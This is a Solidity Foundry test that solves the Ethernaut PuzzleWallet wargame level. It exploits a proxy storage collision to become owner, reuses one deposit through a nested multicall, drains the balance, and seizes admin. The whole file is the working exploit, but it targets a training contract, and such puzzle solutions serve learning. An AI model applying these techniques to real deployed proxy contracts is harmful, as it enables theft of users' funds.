pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { PuzzleWallet, PuzzleProxy } from "src/PuzzleWallet/PuzzleWallet.sol";
import { PuzzleWalletFactory } from "src/PuzzleWallet/PuzzleWalletFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";
import "forge-std/console2.sol";

contract PuzzleWalletTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");

    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testPuzzleWalletHack() external {
        // level setup
        PuzzleWalletFactory factory = new PuzzleWalletFactory();

        vm.startPrank(me);
        vm.deal(me, 2 ether);
        (address proxy, address instance) = factory.createInstance{ value: 1 ether }();

        // propose new admin, this will overlapse owner variable in the implementation contract
        PuzzleProxy(payable(proxy)).proposeNewAdmin(me);
        assertEq(PuzzleWallet(proxy).owner(), me);
        // add to whitelist
        PuzzleWallet(proxy).addToWhitelist(me);

        // in order to setMaxBalance, we have to set the balance of the proxy to 0

        bytes[] memory firstMulticall = new bytes[](1);
        firstMulticall[0] = abi.encodeWithSignature("deposit()");
        bytes[] memory secondMulticall = new bytes[](2);
        secondMulticall[0] = abi.encodeWithSignature("deposit()");
        secondMulticall[1] = abi.encodeWithSignature("multicall(bytes[])", firstMulticall);

        PuzzleWallet(proxy).multicall{ value: 1 ether }(secondMulticall);
        PuzzleWallet(proxy).execute(me, 2 ether, new bytes(0));

        PuzzleWallet(proxy).setMaxBalance(uint256(uint160(me)));

        vm.stopPrank();
        assertEq(PuzzleProxy(payable(proxy)).admin(), me);
    }
}
